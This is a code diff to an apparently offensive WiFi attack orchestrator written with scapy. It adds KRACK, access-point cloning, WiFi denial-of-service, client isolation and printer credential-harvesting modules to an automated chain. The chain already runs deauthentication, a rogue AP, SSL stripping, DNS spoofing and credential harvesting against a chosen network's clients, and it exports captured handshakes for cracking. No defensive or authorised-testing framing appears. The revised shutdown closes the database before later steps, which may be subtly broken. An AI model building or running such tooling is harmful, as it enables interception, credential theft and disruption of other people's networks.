@@ -18,8 +18,8 @@ import time
 import threading
 import os
 
-from scapy.all import sniff, raw, RandMAC, wrpcap
-from scapy.layers.dot11 import Dot11
+from scapy.all import sniff, raw, RandMAC
+from scapy.layers.dot11 import Dot11, Dot11ProbeReq, Dot11Elt
 from scapy.layers.eap import EAPOL
 
 from .config import CHANNELS_24GHZ, WIFI_BROADCAST, log
@@ -39,6 +39,13 @@ from .dns_spoof import DNSSpoofEngine
 from .cred_harvester import CredentialHarvester
 from .network_disruption import NetworkDisruption, DeauthStorm
 from .post_attack import PostAttackAnalyzer
+from .ap_clone import APCloneEngine
+from .krack import KRACKEngine
+from .dos_wifi import WiFiDoSEngine
+from .client_isolation import ClientIsolationEngine
+from .printer_recon import PrinterRecon
+from .print_interceptor import PrintJobInterceptor
+from .printer_creds import PrinterCredentialHarvester as PrinterCredHarvester
 
 
 class AttackOrchestrator:
@@ -59,7 +66,11 @@ class AttackOrchestrator:
                  target_bssid=None, target_ssid=None, target_channel=None,
                  recon_duration=30, enable_beacons=True,
                  enable_karma=True, test_credentials=False,
-                 enable_isolation_check=True, signal_rssi_limit=-80):
+                 enable_isolation_check=True, signal_rssi_limit=-80,
+                 enable_ap_clone=False, enable_krack=False,
+                 enable_dos=False, dos_mode=None,
+                 enable_client_isolation=False,
+                 enable_printer_attacks=False):
         self.monitor_iface = monitor_iface
         self.ap_iface = ap_iface
         self.channels = channels or CHANNELS_24GHZ
@@ -72,6 +83,14 @@ class AttackOrchestrator:
         self.test_credentials = test_credentials
         self.enable_isolation_check = enable_isolation_check
         self.signal_rssi_limit = signal_rssi_limit
+
+        # New attack module flags
+        self.enable_ap_clone = enable_ap_clone
+        self.enable_krack = enable_krack
+        self.enable_dos = enable_dos
+        self.dos_mode = dos_mode or "cts_flood"
+        self.enable_client_isolation = enable_client_isolation
+        self.enable_printer_attacks = enable_printer_attacks
 
         self.db = db or POSDatabase()
         self.recon = ReconEngine(monitor_iface, self.db, channels=self.channels)
@@ -90,6 +109,17 @@ class AttackOrchestrator:
         self.dns_spoof = None
         self.cred_harvester = None
         self.network_disruption = None
+
+        # Advanced WiFi attack modules
+        self.ap_clone = None
+        self.krack_engine = None
+        self.dos_engine = None
+        self.client_isolation = None
+
+        # Printer attack modules
+        self.printer_recon = None
+        self.print_interceptor = None
+        self.printer_cred_harvester = None
 
         self.running = False
 
@@ -119,9 +149,12 @@ class AttackOrchestrator:
     def start(self):
         """Execute the full automated attack chain."""
         self.running = True
+        self._attack_start_time = time.time()
+        log.info(f"Attack chain initiated at {time.strftime('%Y-%m-%d %H:%M:%S')}")
 
         # ── Phase 1: Passive Recon ────────────────────────────────────────────
         log.info(f"Phase 1: Passive recon ({self.recon_duration}s)...")
+        self.recon.set_signal_targeting(self.signal_filter)
         self.recon.start(timeout=self.recon_duration)
         self.recon.stop()
 
@@ -143,14 +176,18 @@ class AttackOrchestrator:
                 log.warning("AP isolation detected - attack may be less effective")
                 log.warning("Clients may not be able to reach our rogue AP")
 
-        # Get all clients of target AP from scan data
-        all_clients = set(self.db.get_clients_for_bssid(self.target_bssid))
+        # Get all clients of target AP from scan data (now returns (mac, rssi) tuples)
+        all_clients_data = self.db.get_clients_for_bssid(self.target_bssid)
+        all_clients = set()
 
-        # Filter by signal strength
+        # Filter by signal strength using RSSI data from database
         close_clients = set()
-        for client in all_clients:
-            if self.signal_filter.should_deauth(client):
-                close_clients.add(client)
+        for client_mac, rssi in all_clients_data:
+            all_clients.add(client_mac)
+            if self.signal_filter.should_deauth(client_mac):
+                close_clients.add(client_mac)
+            elif rssi is not None and self.signal_filter.should_deauth_with_rssi(client_mac, rssi):
+                close_clients.add(client_mac)
 
         log.info(f"Target has {len(all_clients)} total clients, "
                  f"{len(close_clients)} within signal range (RSSI > {self.signal_rssi_limit}dBm)")
@@ -206,6 +243,37 @@ class AttackOrchestrator:
         threading.Thread(target=self.cred_harvester.start, daemon=True).start()
         log.info("Credential harvester started")
 
+        # ── Phase 5d: Advanced WiFi Attacks ──────────────────────────────────
+        if self.enable_ap_clone:
+            self.ap_clone = APCloneEngine(
+                self.monitor_iface, self.db, self.target_bssid,
+                self.target_ssid, self.target_channel)
+            self.ap_clone.start()
+            log.info("AP Clone engine enabled")
+
+        if self.enable_client_isolation:
+            self.client_isolation = ClientIsolationEngine(self.monitor_iface, self.db)
+            for c in close_clients:
+                self.client_isolation.add_target(c, self.target_bssid)
+            self.client_isolation.start()
+            log.info("Client isolation engine enabled")
+
+        if self.enable_dos:
+            self.dos_engine = WiFiDoSEngine(
+                self.monitor_iface, self.target_bssid, self.target_channel)
+            self.dos_engine.start(mode=self.dos_mode)
+            log.info(f"WiFi DoS engine enabled (mode={self.dos_mode})")
+
+        # ── Phase 5e: Printer Attacks ────────────────────────────────────────
+        if self.enable_printer_attacks:
+            self.printer_recon = PrinterRecon(self.monitor_iface, self.db)
+            threading.Thread(target=self.printer_recon.start, daemon=True).start()
+            log.info("Printer reconnaissance enabled")
+
+            self.printer_cred_harvester = PrinterCredHarvester(self.monitor_iface, self.db)
+            threading.Thread(target=self.printer_cred_harvester.start, daemon=True).start()
+            log.info("Printer credential harvester enabled")
+
         # ── Phase 6: Background Recon (feeds new clients into deauth) ────────
         self.recon.running = True
         threading.Thread(target=self._background_recon, daemon=True).start()
@@ -246,6 +314,12 @@ class AttackOrchestrator:
                             pcap_file = self.handshakes.export_pcap(client_mac, bssid)
                             if pcap_file and self.test_credentials:
                                 log.info(f"Handshake saved to {pcap_file} - ready for hashcat")
+                            # Trigger KRACK if enabled
+                            if self.enable_krack and not self.krack_engine:
+                                self.krack_engine = KRACKEngine(
+                                    self.monitor_iface, client_mac, bssid)
+                                self.krack_engine.start()
+                                log.info(f"KRACK engine launched against {client_mac}")
 
             # Dynamically add newly seen clients of the target AP
             if pkt.haslayer(Dot11) and pkt.type == 2:
@@ -277,38 +351,44 @@ class AttackOrchestrator:
             pass
 
     def stop(self):
-        """Shut down all attack components."""
+        """Shut down all attack components gracefully."""
         self.running = False
-        self.recon.stop()
-        self.deauth.stop()
-        if self.beacons:
-            self.beacons.stop()
-        if self.karma:
-            self.karma.stop()
-        if self.rogue_ap:
-            self.rogue_ap.stop()
-        if self.mitm_engine:
-            self.mitm_engine.stop()
-        if self.ssl_stripper:
-            self.ssl_stripper.stop()
-        if self.dns_spoof:
-            self.dns_spoof.stop()
-        if self.cred_harvester:
-            self.cred_harvester.stop()
-        if self.network_disruption:
-            self.network_disruption.stop()
 
+        if hasattr(self, '_attack_start_time'):
+            duration = time.time() - self._attack_start_time
+            log.info(f"Attack duration: {duration:.1f} seconds")
+        
+        # Stop all engines
+        engines = [
+            self.recon, self.deauth, self.beacons, self.karma, 
+            self.rogue_ap, self.mitm_engine, self.ssl_stripper,
+            self.dns_spoof, self.cred_harvester, self.network_disruption,
+            self.ap_clone, self.krack_engine, self.dos_engine,
+            self.client_isolation, self.printer_recon,
+            self.print_interceptor, self.printer_cred_harvester
+        ]
+        
+        for engine in engines:
+            if engine:
+                try:
+                    engine.stop()
+                except Exception as e:
+                    log.error(f"Error stopping {engine.__class__.__name__}: {e}")
+        
+        # Now safe to close database
+        if self.db:
+            self.db.close()
+        
         # Export any remaining handshakes
         remaining = self.handshakes.export_all()
         if remaining:
             log.info(f"Exported {len(remaining)} additional handshakes")
-
+        
         self.recon._print_status()
-        self.db.close()
-
+        
         # Run post-attack analysis
         self._run_post_attack_analysis()
-
+        
         log.info("Attack terminated. All data saved.")
 
     def _run_post_attack_analysis(self):
